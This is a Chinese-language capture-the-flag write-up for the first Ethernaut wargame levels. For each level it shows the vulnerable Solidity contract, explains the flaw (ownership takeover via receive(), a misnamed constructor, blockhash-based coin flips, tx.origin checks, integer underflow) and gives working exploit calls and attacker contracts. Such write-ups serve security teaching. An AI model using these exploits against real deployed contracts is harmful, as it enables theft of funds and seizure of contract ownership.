# Hello Ethernaut
根据提示一步步来就好：
```js
await contract.info()
await contract.info1()
await contract.info2()
await contract.infonum()
await contract.info42()
await contract.theMethodname()
await contract.method7123949()
await contract.password()
await contract.authenticate("ethernaut0")
```

# Fallback
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```
目标是获取 owner 并且把 balance 变为 0。合约在部署时，部署者会成为 owner，并且会有 1000 ether 的初始贡献值。
- contribute() 函数允许用户贡献 小于 0.001 ether 的金额，且如果某个地址的贡献值超过当前 owner 的贡献值，该地址将成为新的 owner。
- receive() 函数允许合约接收以太币，并且如果满足条件（即 msg.value > 0 且 contributions[msg.sender] > 0），将当前调用者设为 owner。

要成为 owner，有两种方法：
- 使用 contribute() 函数，将 contributions[msg.sender] 增加到超过当前 owner 的贡献值。
- 使用 receive() 函数，只要有任何贡献，并发送非零金额的以太币即可成为 owner。

前者显然不太现实，因为需要的 ETH 太多。所以考虑利用 receive() 函数，为了利用 receive() 函数，需要先满足 `contributions[msg.sender] > 0` 条件。 所以 POC 如下：
```solidity
await contract.contribute({value: toWei("0.000001")})
await contract.sendTransaction({value: toWei("0.000001")})
await contract.owner() // 此时已经修改成功
await contract.withdraw()
```
看了其他同学的wp发现还有其他方法：
```solidity
await contract.contribute({value: '100'}) // 不带 toWei 直接单位就是 wei
await contract.send('100')                // 不带 toWei 直接单位就是 wei
```

# Fallout
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```
- 在 Solidity 0.6.0 版本之前，构造函数的名称必须与合约的名称相同。在这个合约中，构造函数名称写作 Fal1out，而不是 Fallout，所以它实际上并不是一个构造函数，而是一个普通的函数。
- 由于这个错误，owner 的初始所有者并没有被正确设置，任何人都可以调用这个 Fal1out 函数并成为 owner。
- 当然，题目之外，本题的合约还有一个问题：任何人都可以通过调用 `function sendAllocation(address payable allocator) public` 退还其他人的 allocation。

```solidity
await contract.Fal1out()
```

# Colin Flip
这是一个掷硬币的游戏，你需要连续的猜对结果。完成这一关，你需要通过你的超能力来连续猜对十次。
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```
- 在合约中，blockValue 是通过 blockhash(block.number - 1) 生成的，而 coinFlip 则是blockValue 除以一个常量 FACTOR 得到的结果。因此，coinFlip 的结果是0或1(FACTOR 是一个接近 2^255 的大数。也就是说，blockValue 除以 FACTOR 只可能得到两个值之一：0 或 1)。由于 blockValue 是可预测的（因为 block.number 和 blockhash 在公开区块链上是已知的），所以我们可以计算出 coinFlip 的值，从而预测硬币的结果。
- 编写一个攻击合约来实现这一点，通过攻击合约去调用另一个合约：
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract Attack {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    ICoinFlip public victimContract = ICoinFlip(0x611d16eA5Ac341EB3D588C9d4eb3Bf3856311A88);

    function attack() public  {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        victimContract.flip(side);
  }
}
```
在 remix 部署，然后重复调用 10 次即可。
```js
(await contract.consecutiveWins()).words[0] // 查看状态，到 10 即可。
```
补充：57896044618658097711785492504343953926634992332820282019728792003956564819968=2^255，所以这里除以这个数可以实现0/1区分。

# Telephone
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```
函数 changeOwner 使用了 tx.origin 和 msg.sender 来决定是否更改 owner。这里的漏洞点在于 tx.origin 和 msg.sender 的区别：
- tx.origin 是最初发起交易的外部账户地址。
- msg.sender 是当前调用该函数的地址。

如果直接调用 changeOwner 函数，tx.origin 和 msg.sender 是相等的，所以不会更改 owner。但如果通过一个中间合约来调用 changeOwner，那么 tx.origin 会是你自己，而 msg.sender 会是中间合约的地址，这时 tx.origin != msg.sender，条件满足，就可以更改 owner。解决思路:编写一个中间合约，通过这个合约去调用 Telephone 合约的 changeOwner 函数，从而满足条件，成功更改 owner。
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}


contract Attack {
    ITelephone public victimContract = ITelephone(0xDDe7254d07e97ce1f0BCD2BC3C39841cb9C6B960);

    function attack() public {
        victimContract.changeOwner(msg.sender);
    }
}
```

# Token
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```
需求：你最开始有 20 个 token, 如果你通过某种方法可以增加你手中的 token 数量，你就可以通过这一关，当然越多越好
代码分析：
```solidity
mapping(address => uint256) balances;

function transfer(address _to, uint256 _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0); // 关键漏洞代码：无符号数减法可能会溢出变成一个极大数
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
}
```
- 在 Solidity 0.8.0 之前，如果进行减法运算的结果小于零，实际上会导致数值从一个非常大的数字开始，而不是抛出错误。
- 攻击步骤：调用 transfer 函数，尝试转账比初始余额更多的 token（如 _value 为 21），这将导致整数下溢。


```solidity
await contract.transfer(contract.address,21)
```